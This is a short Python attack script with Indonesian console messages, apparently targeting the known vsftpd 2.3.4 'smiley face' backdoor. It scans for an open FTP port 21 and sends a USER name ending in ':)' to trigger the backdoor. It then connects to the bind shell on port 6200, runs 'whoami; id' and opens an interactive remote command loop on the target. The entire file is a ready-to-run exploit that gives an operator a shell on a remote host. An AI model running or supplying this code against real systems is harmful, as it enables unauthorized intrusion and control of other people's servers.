import socket
import time
from unittest import result

def scan_port(host,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex ((host,port))
    sock.close()
    return result == 0

def backdoor(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, 21))

        banner = sock.recv(1024)
        print (f"[+] Banner: {banner.decode().strip()}")

        sock.send(b"USER Nicholas:)\r\n")
        sock.recv(1024)

        sock.send(b"PASS pass\r\n")
        time.sleep(0.5)

        return sock
    except Exception as e:
            print (f"[-] Backdoor Error: {e}")
            return None 

def shell(ip):
    try:
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(5)

        print(f"[+] Menyambung PORT 6200 di {ip}")
        shell.connect((ip, 6200))

        print(f"[!!!] Berhasil masuk ke shell")
        shell.send(b"whoami; id\n")

        time.sleep(1)
        resp = shell.recv(1024)
        print(f"[+] Output: {resp.decode().strip()}")

        while True:
            cmd = input("shell@target:~# ") 
            if cmd.lower() in ['exit', 'quit']:
                break
            shell.send (f"{cmd}\n".encode())
            time.sleep(0.8)
            print(shell.recv(4096).decode().strip())

        shell.close()

    except Exception as e:
        print(f"[-] Gagal berinteraksi dengan shell: {e}")

def main():
    ip = input ("Masukkan IP: ")
    print (f"[*] Mengecek Port 21")

    if scan_port(ip, 21):
        print (f"[+] Port 21 Terbuka, mengirim backdoor")

        trigger_conn = backdoor(ip)

        if trigger_conn:
            print ("[*]Menunggu backdoor aktif: * 3 detik *")
            time.sleep (3)
        
            shell(ip)

            trigger_conn.close()
            
    else:
        print (f"[+] Port 21 Tertutup")

if __name__ == "__main__":

    main()